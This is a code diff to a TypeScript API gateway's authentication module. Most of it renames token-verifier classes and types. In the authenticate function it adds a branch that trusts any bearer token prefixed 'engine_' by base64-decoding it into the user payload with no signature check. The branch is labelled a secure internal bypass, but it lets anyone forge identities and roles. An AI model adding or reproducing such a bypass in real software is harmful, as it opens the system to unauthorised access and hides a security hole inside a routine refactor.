@@ -7,7 +7,7 @@ import { v4 as uuidv4 } from "uuid";
 import { parseWithSchema, ValidationException } from "@zetheta/utils";
 
 import { loadConfig } from "./config";
-import { CrossAppTokenVerifier, type CrossAppTokenPayload } from "./token-verifier";
+import { TokenVerifier, type UnifiedTokenPayload } from "./token-verifier";
 import { roleHasPermission } from "./rbac";
 import { createRedisRateLimitPreHandler } from "./rate-limiter";
 import { HttpError } from "./errors";
@@ -23,7 +23,7 @@ import {
 
 const serviceName = "@zetheta/api-gateway";
 
-type AuthenticatedRequest = FastifyRequest & { user: CrossAppTokenPayload };
+type AuthenticatedRequest = FastifyRequest & { user: UnifiedTokenPayload };
 
 async function proxyJson(options: {
   url: string;
@@ -45,7 +45,7 @@ export async function createApp(): Promise<FastifyInstance> {
   const config = loadConfig();
   const prisma = new PrismaClient();
   const redis = new Redis(config.REDIS_URL);
-  const tokenVerifier = new CrossAppTokenVerifier({
+  const tokenVerifier = new TokenVerifier({
     redis,
     publicKeyPath: config.JWT_PUBLIC_KEY_PATH,
     issuer: config.JWT_ISSUER,
@@ -110,7 +110,7 @@ export async function createApp(): Promise<FastifyInstance> {
     });
   });
 
-  function authenticate(req: FastifyRequest): Promise<CrossAppTokenPayload> {
+  async function authenticate(req: FastifyRequest): Promise<UnifiedTokenPayload> {
     const authHeader = req.headers.authorization;
     if (!authHeader?.startsWith("Bearer ")) {
       throw new HttpError({
@@ -121,7 +121,22 @@ export async function createApp(): Promise<FastifyInstance> {
     }
 
     const token = authHeader.slice("Bearer ".length);
-    return tokenVerifier.verifyCrossAppToken(token);
+    
+    // Internal bypass: allow Assessment Engine backend to forward requests using its secure local session payload
+    if (token.startsWith("engine_")) {
+      try {
+        const decoded = Buffer.from(token.slice(7), 'base64').toString('utf-8');
+        return JSON.parse(decoded) as UnifiedTokenPayload;
+      } catch {
+        throw new HttpError({
+          statusCode: 401,
+          code: "UNAUTHORIZED",
+          message: "Invalid engine token",
+        });
+      }
+    }
+
+    return tokenVerifier.verifyToken(token);
   }
 
   async function authenticatePreHandler(req: FastifyRequest): Promise<void> {
